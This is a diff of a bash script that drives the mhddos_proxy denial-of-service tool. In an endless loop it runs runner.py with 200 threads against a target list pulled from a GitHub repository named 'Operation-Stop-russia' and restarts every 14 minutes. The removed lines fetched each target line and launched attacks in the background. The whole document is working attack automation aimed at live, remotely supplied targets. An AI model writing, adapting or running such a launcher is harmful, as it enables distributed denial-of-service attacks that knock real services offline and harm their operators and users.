@@ -1,24 +1,11 @@
 #!/bin/bash
+cd ~
 cd mhddos_proxy
-
-threads="${1:-200}"; threads="-t $threads"
-rpc="--rpc 100"
-debug="--debug"
 
 while true
 do
    #pkill -f runner.py
    sleep 7
-   list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4t.lst | cat | grep "^[^#]" | wc -l)
-   while [[ $list_size = "0"  ]]
-      do
-            sleep 5
-            list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4t.lst | cat | grep "^[^#]" | wc -l)
-      done
-   for (( i=1; i<=list_size; i++ ))
-      do
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4t.lst | cat | grep "^[^#]")")
-            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug&
-      done
+   python3 runner.py -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4_tcp.lst -t 200 --rpc 100 --debug
 sleep 14m
 done
